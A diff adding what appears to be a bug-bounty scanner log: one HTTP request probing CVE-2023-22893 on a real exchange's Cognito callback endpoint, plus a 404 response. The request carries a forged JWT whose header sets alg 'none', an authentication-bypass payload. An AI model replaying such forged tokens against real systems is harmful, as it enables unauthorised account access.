@@ -1,0 +1,37 @@
+[CVE-2023-22893] Dumped HTTP request for https://account.bts.bitpanda.com/api/auth/cognito/callback?access_token=eqzaftsv&id_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJjb2duaXRvOnVzZXJuYW1lIjoiYXhrcmZoa3V2eSIsImVtYWlsIjoie3tlbWFpbH19In0=.
+
+
+GET /api/auth/cognito/callback?access_token=eqzaftsv&id_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJjb2duaXRvOnVzZXJuYW1lIjoiYXhrcmZoa3V2eSIsImVtYWlsIjoie3tlbWFpbH19In0=. HTTP/1.1
+Host: account.bts.bitpanda.com
+User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2023-22893] Dumped HTTP response https://account.bts.bitpanda.com/api/auth/cognito/callback?access_token=eqzaftsv&id_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJjb2duaXRvOnVzZXJuYW1lIjoiYXhrcmZoa3V2eSIsImVtYWlsIjoie3tlbWFpbH19In0=.
+
+HTTP/1.1 404 Not Found
+Connection: close
+Transfer-Encoding: chunked
+Cf-Cache-Status: DYNAMIC
+Cf-Ray: 96a66c07bf0105e2-IAD
+Content-Type: application/json; charset=utf-8
+Date: Tue, 05 Aug 2025 12:50:45 GMT
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Server: cloudflare
+Set-Cookie: _cfuvid=__6NV1ESKgKcjOT9rnknVDZah7RJkSokq8j1zreVirU-1754398245489-0.0.1.1-604800000; path=/; domain=.frontegg.com; HttpOnly; Secure; SameSite=None
+Strict-Transport-Security: max-age=15552000; includeSubDomains
+Via: 1.1 ec8b1bfbf511818c606f196b49f871e2.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: uX0xD77jZTT_Eq3c4-7BPs8r3SrBeLGkJojw_LHvPuH2uFE3dUBIKA==
+X-Amz-Cf-Pop: IAD50-C2
+X-Cache: Error from cloudfront
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+
+{"errors":["The requested URL was not found on this server."]}
